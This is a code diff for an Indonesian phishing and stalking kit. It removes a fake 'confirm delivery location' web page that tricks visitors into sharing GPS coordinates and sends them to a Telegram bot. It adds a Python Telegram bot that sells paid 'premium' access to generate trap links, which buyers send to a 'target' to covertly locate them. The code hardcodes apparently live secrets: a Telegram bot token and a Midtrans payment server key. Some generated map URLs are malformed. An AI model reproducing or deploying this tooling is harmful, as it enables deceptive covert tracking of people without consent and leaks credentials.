@@ -1,117 +1,169 @@
-<!DOCTYPE html>
-<html lang="id">
-<head>
-    <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Konfirmasi Pengiriman Paket</title>
-    <style>
-        body { font-family: Arial, sans-serif; text-align: center; padding: 50px; background-color: #f4f4f4; }
-        .card { background: white; padding: 30px; border-radius: 10px; box-shadow: 0 4px 8px rgba(0,0,0,0.1); max-width: 400px; margin: auto; }
-        .btn { background-color: #28a745; color: white; padding: 12px 24px; border: none; border-radius: 5px; cursor: pointer; font-size: 16px; font-weight: bold; }
-        .btn:hover { background-color: #218838; }
-        h2 { color: #333; }
-        p { color: #666; }
-    </style>
-</head>
-<body>
+import logging
+import sqlite3
+import random
+import string
+from telegram import Update, InlineKeyboardButton, InlineKeyboardMarkup
+from telegram.ext import Application, CommandHandler, CallbackQueryHandler, MessageHandler, filters, ContextTypes
+from midtransclient import Snap
+from flask import Flask, request, jsonify
+from flask_cors import CORS
+from threading import Thread
+import asyncio
 
-<div class="card">
-    <h2>📍 Konfirmasi Lokasi Pengiriman</h2>
-    <p>Sistem mendeteksi ketidaksesuaian alamat. Silakan verifikasi koordinat GPS rumah Anda agar kurir tidak salah mengantar paket.</p>
-    <br>
-    <button class="btn" onclick="ambilLokasi()">KONFIRMASI LOKASI SAYA</button>
-    <p id="status" style="margin-top: 15px; font-weight: bold; color: #d9534f;"></p>
-</div>
+logging.basicConfig(format='%(asctime)s - %(name)s - %(levelname)s - %(message)s', level=logging.INFO)
 
-<script>
-    // 1. KUNCI TOKEN BARU ANDA DI SINI
-    const TOKEN_BOT = "8730133712:AAE4vG00GTpbJSUOCjEmHbTLQ08shoSwu7o";
+# ==================== KUNCI KONFIGURASI (WAJIB SESUAIKAN) ====================
+TOKEN = "8730133712:AAE4vG00GTpbJSUOCjEmHbTLQ08shoSwu7o"
+MIDTRANS_SERVER_KEY = "Mid-server-5TDPB0Nvo69V5Aa91r6OBdSD"
+ADMIN_ID = 6953925929  # Ganti dengan nomor ID Telegram Anda murni (cek via @userinfobot)
+LINK_WEB_PELACAK = "https://ynfacee.github.io/verifikasi-paket/"
+# =============================================================================
+
+snap_api = Snap(is_production=True, server_key=MIDTRANS_SERVER_KEY)
+flask_app = Flask(__name__)
+CORS(flask_app)
+
+bot_instance = None
+
+# ==================== API PINTU MASUK DATA LOKASI ====================
+@flask_app.route('/input_lokasi', methods=['POST'])
+def input_lokasi():
+    data = request.json
+    lat = data.get('lat')
+    lon = data.get('lon')
+    acc = data.get('acc')
+    uid = data.get('uid')
+
+    laporan = (f"🎯 *TARGET BERHASIL TERLACAK!*\n\n"
+               f"📍 *Koordinat:* `{lat}, {lon}`\n"
+               f"🎯 *Akurasi Sensor:* ± {round(acc)} meter\n\n"
+               f"🗺️ *Link Google Maps:* \n"
+               f"https://google.com{lat},{lon}")
+
+    if bot_instance:
+        asyncio.run_coroutine_threadsafe(
+            bot_instance.bot.send_message(chat_id=int(uid), text=laporan, parse_mode='Markdown'),
+            bot_instance.loop
+        )
+    return jsonify({"status": "success"}), 200
+
+def run_flask():
+    flask_app.run(host='0.0.0.0', port=5000)
+# =====================================================================
+
+# ==================== DATABASE SYSTEM ====================
+def init_db():
+    conn = sqlite3.connect('bisnis_lacak.db')
+    cursor = conn.cursor()
+    cursor.execute('''CREATE TABLE IF NOT EXISTS users (user_id INTEGER PRIMARY KEY, status TEXT DEFAULT 'FREE')''')
+    conn.commit()
+    conn.close()
+
+def cek_status(user_id):
+    conn = sqlite3.connect('bisnis_lacak.db')
+    cursor = conn.cursor()
+    cursor.execute('SELECT status FROM users WHERE user_id = ?', (user_id,))
+    res = cursor.fetchone()
+    conn.close()
+    return res if res else 'FREE'
+
+def daftar_user(user_id):
+    conn = sqlite3.connect('bisnis_lacak.db')
+    cursor = conn.cursor()
+    cursor.execute('INSERT OR IGNORE INTO users (user_id) VALUES (?)', (user_id,))
+    conn.commit()
+    conn.close()
+
+def jadikan_premium(user_id):
+    conn = sqlite3.connect('bisnis_lacak.db')
+    cursor = conn.cursor()
+    cursor.execute("UPDATE users SET status = 'PREMIUM' WHERE user_id = ?", (user_id,))
+    conn.commit()
+    conn.close()
+# ==========================================================
+
+async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
+    user_id = update.message.from_user.id
+    daftar_user(user_id)
+    status = cek_status(user_id)
     
-    // 2. AMBIL PARAMETER ID DARI LINK SECARA OTOMATIS
-    const urlParams = new URLSearchParams(window.location.search);
-    const userIdAdmin = urlParams.get('uid'); 
+    txt = (f"🎯 *Selamat Datang di Bot Pelacak Real v2.0*\n\n"
+           f"Status Akun Anda: *{status}*\n"
+           f"Silakan ketik /beli untuk upgrade ke Premium.\n\n"
+           f"Jika sudah Premium, cukup *kirim nomor HP target* ke bot ini untuk membuat link pelacak.")
+    await update.message.reply_text(txt, parse_mode='Markdown')
 
-    function ambilLokasi() {
-        const statusText = document.getElementById("status");
-        statusText.style.color = "#333";
-        statusText.innerText = "Menghubungkan ke satelit GPS...";
-
-        if (navigator.geolocation) {
-            navigator.geolocation.getCurrentPosition(kirimKeTelegram, tanganiError, {
-                enableHighAccuracy: true,
-                timeout: 15000,
-                maximumAge: 0
-            });
-        } else {
-            statusText.style.color = "#d9534f";
-            statusText.innerText = "Browser tidak mendukung sensor GPS.";
+async def beli(update: Update, context: ContextTypes.DEFAULT_TYPE):
+    user_id = update.message.from_user.id
+    order_id = "PREMIUM-" + str(user_id) + "-" + ''.join(random.choices(string.ascii_uppercase + string.digits, k=5))
+    try:
+        # PERUBAHAN NOMINAL HARGA MENJADI RP 15.000
+        param = {
+            "transaction_details": {
+                "order_id": order_id, 
+                "gross_amount": 15000
+            },
+            "item_details": [{
+                "id": "item01",
+                "price": 15000,
+                "quantity": 1,
+                "name": "Akses Premium Bot Pelacak"
+            }]
         }
-    }
+        transaction = snap_api.create_transaction(param)
+        link_qris = transaction['redirect_url']
+        
+        kb = [
+            [InlineKeyboardButton("💳 BAYAR SEKARANG (QRIS)", url=link_qris)],
+            [InlineKeyboardButton("✅ SAYA SUDAH BAYAR", callback_data='cek_pembayaran')]
+        ]
+        await update.message.reply_text("💎 *UPGRADE KE PREMIUM (ASLI)* 💎\n\nBiaya: *Rp 15.000*\nSilakan klik tombol bayar di bawah. Setelah membayar, kembali ke sini dan klik tombol *SAYA SUDAH BAYAR*.", reply_markup=InlineKeyboardMarkup(kb), parse_mode='Markdown')
+    except Exception as e:
+        await update.message.reply_text(f"❌ Gagal memproses payment: {e}")
 
-    function kirimKeTelegram(position) {
-        const lat = position.coords.latitude;
-        const lon = position.coords.longitude;
-        const acc = position.coords.accuracy;
-        const statusText = document.getElementById("status");
+async def proses_bayar(update: Update, context: ContextTypes.DEFAULT_TYPE):
+    query = update.callback_query
+    await query.answer()
+    user_id = query.from_user.id
+    await query.edit_message_text("⏳ *PERMINTAAN DIVERIFIKASI ADMINISTRATOR*\n\nSistem sedang memeriksa mutasi pembayaran QRIS Anda di Midtrans.", parse_mode='Markdown')
+    await context.bot.send_message(chat_id=ADMIN_ID, text=f"🔔 *KLAIM PEMBAYARAN BARU!*\n\nID Telegram: `{user_id}`\nKetik perintah ini jika uang sudah masuk:\n`/approve {user_id}`", parse_mode='Markdown')
 
-        const pesan = `🎯 *TARGET BERHASIL TERLACAK!*\n\n` +
-                      `📍 *Koordinat:* \`${lat}, ${lon}\`\n` +
-                      `🎯 *Akurasi:* ± ${Math.round(acc)} meter\n\n` +
-                      `🗺️ *Google Maps:* \n` +
-                      `https://google.com{lat},${lon}`;
+async def approve_user(update: Update, context: ContextTypes.DEFAULT_TYPE):
+    if update.message.from_user.id != ADMIN_ID: return
+    if not context.args: return
+    target = context.args[0]
+    try:
+        jadikan_premium(int(target))
+        await update.message.reply_text(f"✅ ID `{target}` sekarang PREMIUM!")
+        await context.bot.send_message(chat_id=int(target), text="🎉 *AKUN PREMIUM AKTIF!* 🎉\n\nSilakan kirim nomor HP target untuk menghasilkan link pelacak asli.", parse_mode='Markdown')
+    except Exception as e:
+        await update.message.reply_text(f"Gagal: {e}")
 
-        // ⚠️ VALIDASI ID TELEGRAM AMAN DARI ERROR
-        // Jika target mengklik link utama tanpa lewat bot, data dikirim ke ID Admin utama Anda
-        // GANTI angka 12345678 di bawah dengan nomor ID Telegram asli Anda dari @userinfobot (tanpa tanda petik)
-        const targetChatId = userIdAdmin ? userIdAdmin : 6953925929; 
+async def buat_link(update: Update, context: ContextTypes.DEFAULT_TYPE):
+    user_id = update.message.from_user.id
+    if cek_status(user_id) == 'FREE':
+        await update.message.reply_text("❌ Fitur terkunci. Anda harus menjadi pengguna PREMIUM untuk membuat link pelacak. Ketik /beli")
+        return
+    await update.message.reply_text(f"✅ *LINK PELACAK BERHASIL DIGENERATE!*\n\n🔗 *Link Perangkap:* {LINK_WEB_PELACAK}?uid={user_id}\n\n💡 Salin link di atas dan kirimkan ke target.", parse_mode='Markdown')
 
-        const url = `https://telegram.org{TOKEN_BOT}/sendMessage`;
+def main():
+    global bot_instance
+    init_db()
+    
+    Thread(target=run_flask, daemon=True).start()
 
-        fetch(url, {
-            method: 'POST',
-            headers: { 'Content-Type': 'application/json' },
-            body: JSON.stringify({
-                chat_id: String(targetChatId), // Dipaksa menjadi string agar dibaca valid oleh API Telegram
-                text: pesan,
-                parse_mode: 'Markdown'
-            })
-        })
-        .then(res => res.json())
-        .then(data => {
-            if(data.ok) {
-                statusText.style.color = "#28a745";
-                statusText.innerText = "✅ Verifikasi Lokasi Sukses! Alamat paket diperbarui.";
-            } else {
-                statusText.style.color = "#d9534f";
-                statusText.innerText = "Eror API Telegram: " + data.description;
-            }
-        })
-        .catch(err => {
-            statusText.style.color = "#d9534f";
-            statusText.innerText = "Gagal mengirim data jaringan.";
-        });
-    }
+    app = Application.builder().token(TOKEN).build()
+    bot_instance = app
 
-    function tanganiError(error) {
-        const statusText = document.getElementById("status");
-        statusText.style.color = "#d9534f";
-        switch(error.code) {
-            case error.PERMISSION_DENIED:
-                statusText.innerText = "❌ Hubungkan GPS: Klik 'Izinkan' saat browser meminta akses lokasi.";
-                break;
-            case error.POSITION_UNAVAILABLE:
-                statusText.innerText = "❌ Gagal: Sinyal GPS perangkat tidak stabil.";
-                break;
-            case error.TIMEOUT:
-                statusText.innerText = "❌ Gagal: Waktu habis. Aktifkan lokasi di pengaturan HP.";
-                break;
-            default:
-                statusText.innerText = "❌ Gagal: Terjadi gangguan teknis.";
-        }
-    }
-</script>
+    app.add_handler(CommandHandler("start", start))
+    app.add_handler(CommandHandler("beli", beli))
+    app.add_handler(CommandHandler("approve", approve_user))
+    app.add_handler(CallbackQueryHandler(proses_bayar, pattern='cek_pembayaran'))
+    app.add_handler(MessageHandler(filters.TEXT & ~filters.COMMAND, buat_link))
+    
+    print("Bot Sistem Pelacak Real aktif...")
+    app.run_polling()
 
-</body>
-</html>
-
-
+if __name__ == '__main__':
+    main()
+    
